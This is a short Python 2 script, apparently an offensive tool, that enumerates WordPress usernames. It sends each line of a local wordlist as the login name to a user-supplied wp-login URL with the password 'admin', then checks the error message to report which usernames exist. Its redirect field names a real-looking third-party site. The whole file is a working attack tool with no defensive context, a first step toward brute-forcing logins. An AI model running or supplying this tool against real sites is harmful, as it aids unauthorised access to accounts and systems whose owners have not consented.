from __future__ import print_function
import pycurl
import urllib;from urllib import urlencode
import StringIO;from StringIO import StringIO
import sys
import bs4;from bs4 import BeautifulSoup
import time
import re
import StringIO
from StringIO import StringIO
from time import sleep

url=raw_input("Enter the wordpress url: ")
print("Developed by Tekchand")
datas=StringIO()
handler=pycurl.Curl()
with open("/home/jack/linuxdata/sshbrute/password.txt",'rb') as fp:
    for i in fp.readlines():
        maker=[('log',str(i).strip()),('pwd','admin'),('wp-submit','Log In'),('redirect_to','https://axiomtechgroup.com/wordpress-axiom/wp-login.php?redirect_to=https%3A%2F%2Faxiomtechgroup.com%2Fwordpress-axiom%2Fwp-admin%2F&reauth=1'),('testcookie','1')]
        handler.setopt(handler.URL,str(url))
        handler.setopt(handler.HTTPHEADER,['Content-Type:application/x-www-form-urlencoded','Cookie:wordpress_test_cookie=WP+Cookie+check','User-Agent:Mozilla/firefox Gecko 1.0'])
        handler.setopt(handler.POSTFIELDS,urlencode(maker))
        handler.setopt(handler.HEADER,True)
        handler.setopt(handler.FOLLOWLOCATION,True)
        handler.setopt(handler.WRITEFUNCTION,datas.write)
        data=handler.perform()
        scraper=BeautifulSoup(datas.getvalue(),features="html5lib")
        tester=scraper.find('div',id="login_error")
        if re.findall("The.*username",str(tester)):
            print("Enumerated  PASS user at %s\t\t" % (i),end=str(handler.getinfo(handler.HTTP_CODE)))
            sleep(1)
        else:
            print("failed\t\t{}".format(i),end=str(handler.getinfo(handler.HTTP_CODE)))
        datas.truncate(0)
        
